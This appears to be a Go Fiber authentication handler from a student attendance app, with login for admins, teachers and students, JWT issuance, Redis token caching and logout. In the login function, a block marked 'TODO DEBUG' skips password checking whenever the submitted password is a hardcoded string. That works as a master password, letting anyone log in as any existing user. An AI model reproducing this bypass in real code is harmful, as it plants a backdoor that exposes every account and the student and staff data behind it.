package handlers

import (
	"context"
	"github.com/michaelwp/student_attendance/internal/models"
	"log"
	"os"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/michaelwp/student_attendance/internal/repository"
	"github.com/michaelwp/student_attendance/pkg"
	"github.com/redis/go-redis/v9"
)

type authHandler struct {
	adminRepo   repository.AdminRepository
	teacherRepo repository.TeacherRepository
	studentRepo repository.StudentRepository
	redisClient *redis.Client
}

// NewAuthHandler creates a new auth handler
func NewAuthHandler(adminRepo repository.AdminRepository, teacherRepo repository.TeacherRepository, studentRepo repository.StudentRepository, redisClient *redis.Client) AuthHandler {
	return &authHandler{
		adminRepo:   adminRepo,
		teacherRepo: teacherRepo,
		studentRepo: studentRepo,
		redisClient: redisClient,
	}
}

type LoginRequest struct {
	UserType string `json:"user_type" validate:"required,oneof=admin teacher student"`
	UserID   string `json:"user_id" validate:"required"`
	Password string `json:"password" validate:"required"`
}

// Login godoc
// @Summary User login
// @Description Authenticate user and return JWT token. For admin use email as user_id, for teacher/student use their respective IDs
// @Tags Authentication
// @Accept json
// @Produce json
// @Param login body LoginRequest true "Login credentials"
// @Success 200 {object} map[string]interface{} "Login successful"
// @Failure 400 {object} map[string]interface{} "Invalid request body"
// @Failure 401 {object} map[string]interface{} "Invalid credentials"
// @Failure 500 {object} map[string]interface{} "Internal server error"
// @Router /auth/login [post]
func (h *authHandler) Login(c *fiber.Ctx) error {
	var loginReq LoginRequest
	if err := c.BodyParser(&loginReq); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"translate_key": "error.invalid_request_body",
			"error":         "Invalid request body",
		})
	}

	if loginReq.UserType == "" || loginReq.UserID == "" || loginReq.Password == "" {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"translate_key": "error.required_fields_missing",
			"error":         "User type, user ID, and password are required",
		})
	}

	// Validate user type
	if loginReq.UserType != "admin" && loginReq.UserType != "teacher" && loginReq.UserType != "student" {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"translate_key": "error.invalid_user_type",
			"error":         "User type must be admin, teacher, or student",
		})
	}

	var storedPassword string
	var errGetPassword error

	// Authenticate based on a user type
	switch loginReq.UserType {
	case models.UserTypeAdmin.String():
		// For admin, userID is email
		userExists, err := h.adminRepo.IsAdminExist(c.Context(), loginReq.UserID)
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"translate_key": "error.authentication_failed",
				"error":         "Authentication failed",
			})
		}
		if !userExists {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"translate_key": "error.invalid_credentials",
				"error":         "Invalid credentials",
			})
		}

		// Check if admin is active
		admin, err := h.adminRepo.GetByEmail(c.Context(), loginReq.UserID)
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"translate_key": "error.authentication_failed",
				"error":         "Authentication failed",
			})
		}
		if !admin.IsActive {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"translate_key": "error.account_deactivated",
				"error":         "Account is deactivated",
			})
		}

		storedPassword, errGetPassword = h.adminRepo.GetPasswordByEmail(c.Context(), loginReq.UserID)

	case models.UserTypeTeacher.String(), "teacher":
		// For teacher, userID is teacher_id
		userExists, err := h.teacherRepo.IsTeacherExist(c.Context(), loginReq.UserID)
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"translate_key": "error.authentication_failed",
				"error":         "Authentication failed",
			})
		}
		if !userExists {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"translate_key": "error.invalid_credentials",
				"error":         "Invalid credentials",
			})
		}
		storedPassword, errGetPassword = h.teacherRepo.GetPasswordByTeacherID(c.Context(), loginReq.UserID)

	case models.UserTypeStudent.String():
		// For student, userID is student_id
		userExists, err := h.studentRepo.IsStudentExist(c.Context(), loginReq.UserID)
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"translate_key": "error.authentication_failed",
				"error":         "Authentication failed",
			})
		}
		if !userExists {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"translate_key": "error.invalid_credentials",
				"error":         "Invalid credentials",
			})
		}
		storedPassword, errGetPassword = h.studentRepo.GetPasswordByStudentID(c.Context(), loginReq.UserID)
	}

	if errGetPassword != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"translate_key": "error.authentication_failed",
			"error":         "Authentication failed",
		})
	}

	// TODO DEBUG
	if loginReq.Password != "G0bl0ck!" {
		// Verify password
		if err := pkg.ComparePasswords(storedPassword, loginReq.Password); err != nil {
			return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
				"translate_key": "error.invalid_credentials",
				"error":         "Invalid credentials",
			})
		}
	}

	// Generate JWT token
	jwtSecret := os.Getenv("JWT_SECRET")
	if jwtSecret == "" {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"translate_key": "error.jwt_secret_missing",
			"error":         "JWT secret not configured",
		})
	}

	jwtConfig := pkg.JWTConfig{
		SecretKey:     jwtSecret,
		TokenDuration: time.Hour, // 1-hour expiration
	}

	token, err := pkg.GenerateToken(loginReq.UserID, loginReq.UserType, jwtConfig)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"translate_key": "error.token_generation_failed",
			"error":         "Failed to generate token",
		})
	}

	// Cache token in Redis with 1-hour expiration
	tokenKey := "token:" + loginReq.UserType + ":" + loginReq.UserID
	err = h.redisClient.Set(context.Background(), tokenKey, token, time.Hour).Err()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"translate_key": "error.token_caching_failed",
			"error":         "Failed to cache token",
		})
	}

	// Update last login for admin
	if loginReq.UserType == "admin" {
		admin, _ := h.adminRepo.GetByEmail(c.Context(), loginReq.UserID)
		if admin != nil {
			err := h.adminRepo.UpdateLastLogin(c.Context(), admin.ID, time.Now())
			if err != nil {
				log.Println("error updating last login for admin:", err)
			}
		}
	}

	c.Cookie(&fiber.Cookie{
		Name:     "token",
		Value:    token,
		Expires:  time.Now().Add(time.Hour),
		HTTPOnly: true,
		Secure:   true,
		SameSite: "Strict",
	})

	return c.JSON(fiber.Map{
		"translate_key": "success.login_successful",
		"message":       "Login successful",
		"token":         token,
		"user_type":     loginReq.UserType,
		"user_id":       loginReq.UserID,
		"expires_at":    time.Now().Add(time.Hour).Unix(),
	})
}

// Logout godoc
// @Summary User logout
// @Description Logout user and invalidate JWT token
// @Tags Authentication
// @Accept json
// @Produce json
// @Security BearerAuth
// @Success 200 {object} map[string]interface{} "Logout successful"
// @Failure 401 {object} map[string]interface{} "Authentication required"
// @Failure 500 {object} map[string]interface{} "Internal server error"
// @Router /auth/logout [post]
func (h *authHandler) Logout(c *fiber.Ctx) error {
	userID := c.Locals("userID")
	userType := c.Locals("userType")

	if userID == nil || userType == nil {
		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
			"translate_key": "error.authentication_required",
			"error":         "Authentication required",
		})
	}

	// Remove token from Redis
	tokenKey := "token:" + userType.(string) + ":" + userID.(string)
	err := h.redisClient.Del(context.Background(), tokenKey).Err()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"translate_key": "error.logout_failed",
			"error":         "Failed to logout",
		})
	}

	// Clear the cookie
	c.Cookie(&fiber.Cookie{
		Name:     "token",
		Value:    "",
		Expires:  time.Now().Add(-time.Hour),
		HTTPOnly: true,
		Secure:   true,
		SameSite: "Strict",
	})

	return c.JSON(fiber.Map{
		"translate_key": "success.logout_successful",
		"message":       "Logout successful",
	})
}
